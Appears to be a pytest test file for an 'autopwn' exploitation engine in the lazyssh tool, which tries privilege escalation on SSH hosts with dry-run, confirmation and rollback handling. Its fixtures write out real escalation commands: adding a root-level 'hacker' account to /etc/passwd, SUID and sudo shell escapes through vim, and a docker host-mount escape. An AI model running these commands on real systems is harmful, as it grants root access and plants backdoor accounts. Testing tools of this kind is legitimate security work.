"""Tests for the autopwn exploitation engine."""

from __future__ import annotations

from datetime import UTC, datetime
from unittest import mock

import pytest

from lazyssh.plugins import enumerate as enumerate_plugin
from lazyssh.plugins._autopwn import (
    AutopwnEngine,
    AutopwnResult,
    ExploitAttempt,
    _confirm,
    _ssh_exec,
)


def _probe(
    category: str, key: str, stdout: str, status: int = 0, stderr: str = ""
) -> enumerate_plugin.ProbeOutput:
    return enumerate_plugin.ProbeOutput(
        category=category,
        key=key,
        command="<test>",
        timeout=5,
        status=status,
        stdout=stdout,
        stderr=stderr,
        encoding="base64",
    )


def _snapshot(
    probes: dict[str, dict[str, enumerate_plugin.ProbeOutput]],
) -> enumerate_plugin.EnumerationSnapshot:
    return enumerate_plugin.EnumerationSnapshot(
        collected_at=datetime.now(UTC),
        probes=probes,
        warnings=[],
    )


class TestExploitAttempt:
    """Tests for ExploitAttempt dataclass."""

    def test_basic_creation(self) -> None:
        attempt = ExploitAttempt(
            technique="test",
            target="/etc/passwd",
            dry_run=False,
            command="echo test",
            success=True,
            output="ok",
        )
        assert attempt.technique == "test"
        assert attempt.rollback_command is None

    def test_with_rollback(self) -> None:
        attempt = ExploitAttempt(
            technique="test",
            target="/etc/passwd",
            dry_run=False,
            command="echo test",
            success=True,
            output="ok",
            rollback_command="echo undo",
        )
        assert attempt.rollback_command == "echo undo"


class TestAutopwnResult:
    """Tests for AutopwnResult dataclass."""

    def test_empty_result(self) -> None:
        result = AutopwnResult()
        assert result.attempts == []
        assert result.successes == 0
        assert result.failures == 0

    def test_with_attempts(self) -> None:
        result = AutopwnResult(
            attempts=[
                ExploitAttempt("t1", "x", False, "cmd1", True, "ok"),
                ExploitAttempt("t2", "y", False, "cmd2", False, "fail"),
                ExploitAttempt("t3", "z", True, "cmd3", True, "dry"),
            ]
        )
        assert result.successes == 2  # t1 + t3
        assert result.failures == 1  # t2 (not dry-run and not success)


class TestSshExec:
    """Tests for _ssh_exec function."""

    def test_missing_env_vars(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("LAZYSSH_SOCKET_PATH", raising=False)
        monkeypatch.delenv("LAZYSSH_HOST", raising=False)
        monkeypatch.delenv("LAZYSSH_USER", raising=False)
        exit_code, stdout, stderr = _ssh_exec("echo test")
        assert exit_code == 1
        assert "Missing SSH" in stderr

    def test_successful_exec(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.delenv("LAZYSSH_PORT", raising=False)

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "hello"
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            exit_code, stdout, stderr = _ssh_exec("echo hello")
            assert exit_code == 0
            assert stdout == "hello"
            # Verify SSH command construction
            call_args = mock_run.call_args[0][0]
            assert "-S" in call_args
            assert "/tmp/sock" in call_args

    def test_with_port(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")
        monkeypatch.setenv("LAZYSSH_PORT", "2222")

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with mock.patch("subprocess.run", return_value=mock_result) as mock_run:
            _ssh_exec("echo test")
            call_args = mock_run.call_args[0][0]
            assert "-p" in call_args
            assert "2222" in call_args

    def test_timeout(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        with mock.patch(
            "subprocess.run", side_effect=__import__("subprocess").TimeoutExpired(["ssh"], 30)
        ):
            exit_code, stdout, stderr = _ssh_exec("sleep 999")
            assert exit_code == 1
            assert "timed out" in stderr


class TestConfirm:
    """Tests for _confirm function."""

    def test_confirm_yes(self) -> None:
        with mock.patch("lazyssh.plugins._autopwn.Confirm") as mock_confirm:
            mock_confirm.ask.return_value = True
            assert _confirm("Proceed?") is True
            mock_confirm.ask.assert_called_once()

    def test_confirm_no(self) -> None:
        with mock.patch("lazyssh.plugins._autopwn.Confirm") as mock_confirm:
            mock_confirm.ask.return_value = False
            assert _confirm("Proceed?") is False


class TestAutopwnEngineNoFindings:
    """Tests for AutopwnEngine with no exploitable findings."""

    def test_no_findings(self) -> None:
        snapshot = _snapshot({})
        findings: list[enumerate_plugin.PriorityFinding] = []
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert result.attempts == []

    def test_findings_without_exploit_commands(self) -> None:
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="world_writable_dirs",
                category="filesystem",
                severity="medium",
                headline="World-writable dirs",
                detail="Found dirs",
                evidence=["/opt/shared"],
                exploitation_difficulty="",
                exploit_commands=[],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert result.attempts == []


class TestAutopwnEngineWritablePasswd:
    """Tests for writable /etc/passwd exploitation."""

    def test_dry_run(self) -> None:
        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="World-writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd is world-writable"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
                    "su hacker  # password: password",
                ],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 1
        assert result.attempts[0].dry_run is True
        assert result.attempts[0].technique == "writable_passwd"
        assert result.attempts[0].rollback_command is not None

    def test_live_confirmed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="World-writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd is world-writable"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
                    "su hacker  # password: password",
                ],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is True
            assert result.attempts[0].dry_run is False

    def test_live_declined(self) -> None:
        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="World-writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd is world-writable"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
                    "su hacker  # password: password",
                ],
            )
        ]

        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 0


class TestAutopwnEngineGtfobinsSuid:
    """Tests for GTFOBins SUID exploitation."""

    def test_dry_run_suid(self) -> None:
        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/vim\n/usr/bin/find\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID binaries exploitable via GTFOBins",
                detail="Found 2 SUID binaries",
                evidence=["/usr/bin/vim", "/usr/bin/find"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "# vim (/usr/bin/vim): SUID shell via vim python",
                    './vim -c \':py3 import os; os.execl("/bin/sh", "sh", "-p")\'',
                ],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Should attempt both vim and find
        assert len(result.attempts) >= 2
        assert all(a.dry_run for a in result.attempts)

    def test_live_suid_stops_after_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/vim\n/usr/bin/find\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID binaries exploitable",
                detail="Found 2",
                evidence=["/usr/bin/vim", "/usr/bin/find"],
                exploitation_difficulty="instant",
                exploit_commands=["./vim -c ':!/bin/sh'"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "root shell"
        mock_result.stderr = ""

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            # Should stop after first success (vim)
            assert len(result.attempts) == 1
            assert result.attempts[0].success is True

    def test_suid_no_probe_data(self) -> None:
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID binaries exploitable",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="instant",
                exploit_commands=["./vim -c ':!/bin/sh'"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnEngineGtfobinsSudo:
    """Tests for GTFOBins sudo exploitation."""

    def test_dry_run_sudo(self) -> None:
        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n"
                    "    (root) NOPASSWD: /usr/bin/vim\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_sudo",
                category="users",
                severity="high",
                headline="Sudo-allowed binaries exploitable",
                detail="Found 1",
                evidence=["(root) NOPASSWD: /usr/bin/vim"],
                exploitation_difficulty="instant",
                exploit_commands=["sudo vim -c ':!/bin/sh'"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) >= 1
        assert result.attempts[0].dry_run is True
        assert result.attempts[0].technique == "gtfobins_sudo"

    def test_sudo_no_probe(self) -> None:
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_sudo",
                category="users",
                severity="high",
                headline="Sudo-allowed binaries exploitable",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="instant",
                exploit_commands=["sudo vim -c ':!/bin/sh'"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnEngineDockerEscape:
    """Tests for docker escape exploitation."""

    def test_dry_run_docker(self) -> None:
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="docker_escape",
                category="container",
                severity="high",
                headline="Docker group access",
                detail="Docker escape possible",
                evidence=["User is in docker group"],
                exploitation_difficulty="easy",
                exploit_commands=["docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 1
        assert result.attempts[0].technique == "docker_escape"
        assert result.attempts[0].dry_run is True

    def test_live_docker_declined(self) -> None:
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="docker_escape",
                category="container",
                severity="high",
                headline="Docker group access",
                detail="Docker escape possible",
                evidence=["User is in docker group"],
                exploitation_difficulty="easy",
                exploit_commands=["docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash"],
            )
        ]

        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 0


class TestAutopwnEngineWritableCron:
    """Tests for writable cron exploitation."""

    def test_dry_run_cron(self) -> None:
        probes = {
            "writable": {
                "writable_cron": _probe(
                    "writable",
                    "writable_cron",
                    "WRITABLE:/etc/crontab\nDONE\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron files",
                detail="Found 1 writable cron file",
                evidence=["/etc/crontab"],
                exploitation_difficulty="moderate",
                exploit_commands=["# Inject cron payload"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 1
        assert result.attempts[0].technique == "writable_cron"
        assert result.attempts[0].rollback_command is not None
        assert "rootsh" in result.attempts[0].rollback_command

    def test_cron_no_writable_files(self) -> None:
        probes = {
            "writable": {
                "writable_cron": _probe("writable", "writable_cron", "DONE\n"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron files",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="moderate",
                exploit_commands=["# Inject cron payload"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnEngineWritableService:
    """Tests for writable service file exploitation."""

    def test_dry_run_service(self) -> None:
        probes = {
            "writable": {
                "writable_services": _probe(
                    "writable",
                    "writable_services",
                    "/etc/systemd/system/custom.service\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_service_files",
                category="writable",
                severity="high",
                headline="Writable systemd service files",
                detail="Found 1 writable service",
                evidence=["/etc/systemd/system/custom.service"],
                exploitation_difficulty="moderate",
                exploit_commands=["# Modify service ExecStart"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 1
        assert result.attempts[0].technique == "writable_service"
        assert "custom.service" in result.attempts[0].target

    def test_service_none_writable(self) -> None:
        probes = {
            "writable": {
                "writable_services": _probe("writable", "writable_services", "NONE_WRITABLE"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_service_files",
                category="writable",
                severity="high",
                headline="Writable systemd service files",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="moderate",
                exploit_commands=["# Modify service ExecStart"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnEngineGenericDisplay:
    """Tests for generic exploit display for unhandled finding types."""

    def test_generic_display_for_unknown_key(self) -> None:
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="kernel_exploits",
                category="system",
                severity="high",
                headline="Kernel exploits",
                detail="Kernel matches CVEs",
                evidence=["CVE-2022-0847"],
                exploitation_difficulty="moderate",
                exploit_commands=["# CVE-2022-0847 (Dirty Pipe): https://example.com"],
            )
        ]
        # Should not crash, just display info
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Generic display doesn't create attempts
        assert len(result.attempts) == 0


class TestAutopwnEngineSorting:
    """Test that findings are sorted by difficulty."""

    def test_instant_before_moderate(self) -> None:
        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
                "writable_cron": _probe(
                    "writable", "writable_cron", "WRITABLE:/etc/crontab\nDONE\n"
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron",
                detail="Found writable cron",
                evidence=["/etc/crontab"],
                exploitation_difficulty="moderate",
                exploit_commands=["# cron exploit"],
            ),
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="Writable /etc/passwd",
                detail="Writable passwd",
                evidence=["/etc/passwd"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
                ],
            ),
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Writable passwd (instant) should be attempted before cron (moderate)
        techniques = [a.technique for a in result.attempts]
        assert techniques.index("writable_passwd") < techniques.index("writable_cron")


class TestAutopwnEngineLiveExecution:
    """Tests for live execution with mocked subprocess."""

    def test_live_suid_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "filesystem": {
                "suid_files": _probe("filesystem", "suid_files", "/usr/bin/vim\n"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID exploitable",
                detail="Found 1",
                evidence=["/usr/bin/vim"],
                exploitation_difficulty="instant",
                exploit_commands=["./vim -c ':!/bin/sh'"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "permission denied"

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is False
            assert result.failures == 1

    def test_live_cron_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_cron": _probe(
                    "writable", "writable_cron", "WRITABLE:/etc/crontab\nDONE\n"
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_cron_files",
                category="writable",
                severity="medium",
                headline="Writable cron",
                detail="Found 1 writable cron file",
                evidence=["/etc/crontab"],
                exploitation_difficulty="moderate",
                exploit_commands=["# cron payload"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is True
            assert result.attempts[0].rollback_command is not None

    def test_live_docker_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="docker_escape",
                category="container",
                severity="high",
                headline="Docker escape",
                detail="Docker accessible",
                evidence=["Docker socket accessible"],
                exploitation_difficulty="easy",
                exploit_commands=["docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "root shell"
        mock_result.stderr = ""

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is True

    def test_live_service_success(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_services": _probe(
                    "writable",
                    "writable_services",
                    "/etc/systemd/system/custom.service\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_service_files",
                category="writable",
                severity="high",
                headline="Writable service files",
                detail="Found 1",
                evidence=["/etc/systemd/system/custom.service"],
                exploitation_difficulty="moderate",
                exploit_commands=["# Modify service ExecStart"],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""
        mock_result.stderr = ""

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is True


class TestAutopwnSummaryRendering:
    """Tests for summary rendering."""

    def test_summary_with_rollbacks(self) -> None:
        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="Writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
                ],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Verify summary rendering doesn't crash
        assert result.successes >= 1


class TestWritablePasswdEdgeCases:
    """Edge case tests for writable passwd exploit."""

    def test_exploit_commands_only_comments(self) -> None:
        """Test finding with only comment commands is skipped."""
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="Writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd"],
                exploitation_difficulty="instant",
                exploit_commands=["# This is a comment", "# Another comment"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0

    def test_empty_exploit_commands(self) -> None:
        """Test finding with empty exploit commands."""
        snapshot = _snapshot({})
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="Writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd"],
                exploitation_difficulty="instant",
                exploit_commands=[],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0


class TestAutopwnPasswdFailure:
    """Tests for writable passwd exploit failure path."""

    def test_live_passwd_failed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test writable passwd exploit that fails (non-zero exit)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "writable": {
                "writable_passwd": _probe("writable", "writable_passwd", "WRITABLE"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="writable_passwd_file",
                category="writable",
                severity="critical",
                headline="World-writable /etc/passwd",
                detail="/etc/passwd is writable",
                evidence=["/etc/passwd is world-writable"],
                exploitation_difficulty="instant",
                exploit_commands=[
                    "echo 'hacker:hash:0:0::/root:/bin/bash' >> /etc/passwd",
                    "su hacker",
                ],
            )
        ]

        mock_result = mock.MagicMock()
        mock_result.returncode = 1
        mock_result.stdout = ""
        mock_result.stderr = "permission denied"

        with (
            mock.patch("lazyssh.plugins._autopwn._confirm", return_value=True),
            mock.patch("subprocess.run", return_value=mock_result),
        ):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 1
            assert result.attempts[0].success is False


class TestAutopwnSuidEdgeCases:
    """Tests for SUID exploit edge cases."""

    def test_suid_empty_lines_in_probe(self) -> None:
        """Test SUID probe with empty lines between paths (line 252)."""
        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/vim\n\n  \n/usr/bin/find\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID exploitable",
                detail="Found 2",
                evidence=["/usr/bin/vim", "/usr/bin/find"],
                exploitation_difficulty="instant",
                exploit_commands=["./vim -c ':!/bin/sh'"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Should handle empty lines gracefully and still find vim and find
        assert len(result.attempts) >= 2

    def test_suid_unknown_binary_no_gtfobins(self) -> None:
        """Test SUID binary not in GTFOBins (line 256)."""
        probes = {
            "filesystem": {
                "suid_files": _probe(
                    "filesystem",
                    "suid_files",
                    "/usr/bin/unknownbinary123\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID exploitable",
                detail="Found 1",
                evidence=["/usr/bin/unknownbinary123"],
                exploitation_difficulty="instant",
                exploit_commands=["./unknownbinary123"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Unknown binary should be skipped (no GTFOBins match)
        assert len(result.attempts) == 0

    def test_suid_user_declines(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test SUID exploit user decline (lines 283-284)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "filesystem": {
                "suid_files": _probe("filesystem", "suid_files", "/usr/bin/vim\n"),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_suid",
                category="filesystem",
                severity="high",
                headline="SUID exploitable",
                detail="Found 1",
                evidence=["/usr/bin/vim"],
                exploitation_difficulty="instant",
                exploit_commands=["./vim -c ':!/bin/sh'"],
            )
        ]

        with mock.patch("lazyssh.plugins._autopwn._confirm", return_value=False):
            engine = AutopwnEngine(snapshot, findings, dry_run=False)
            result = engine.run()
            assert len(result.attempts) == 0


class TestAutopwnSudoEdgeCases:
    """Tests for sudo exploit edge cases."""

    def test_sudo_no_absolute_path_fallback(self) -> None:
        """Test sudo line with no absolute path (lines 328-333)."""
        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n    (root) NOPASSWD: vim\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_sudo",
                category="users",
                severity="high",
                headline="Sudo exploitable",
                detail="Found 1",
                evidence=["(root) NOPASSWD: vim"],
                exploitation_difficulty="instant",
                exploit_commands=["sudo vim -c ':!/bin/sh'"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        # Should find vim even without absolute path via fallback
        assert len(result.attempts) >= 1

    def test_sudo_unknown_binary_no_gtfobins(self) -> None:
        """Test sudo line with binary not in GTFOBins DB (line 337)."""
        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n"
                    "    (root) NOPASSWD: /usr/bin/nonexistentbinary\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
                key="gtfobins_sudo",
                category="users",
                severity="high",
                headline="Sudo exploitable",
                detail="Found 0",
                evidence=[],
                exploitation_difficulty="instant",
                exploit_commands=["sudo nonexistentbinary"],
            )
        ]
        engine = AutopwnEngine(snapshot, findings, dry_run=True)
        result = engine.run()
        assert len(result.attempts) == 0

    def test_sudo_user_decline(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """Test user declines sudo exploit (lines 361-363)."""
        monkeypatch.setenv("LAZYSSH_SOCKET_PATH", "/tmp/sock")
        monkeypatch.setenv("LAZYSSH_HOST", "testhost")
        monkeypatch.setenv("LAZYSSH_USER", "testuser")

        probes = {
            "users": {
                "sudo_check": _probe(
                    "users",
                    "sudo_check",
                    "User user may run the following commands:\n"
                    "    (root) NOPASSWD: /usr/bin/vim\n",
                ),
            },
        }
        snapshot = _snapshot(probes)
        findings = [
            enumerate_plugin.PriorityFinding(
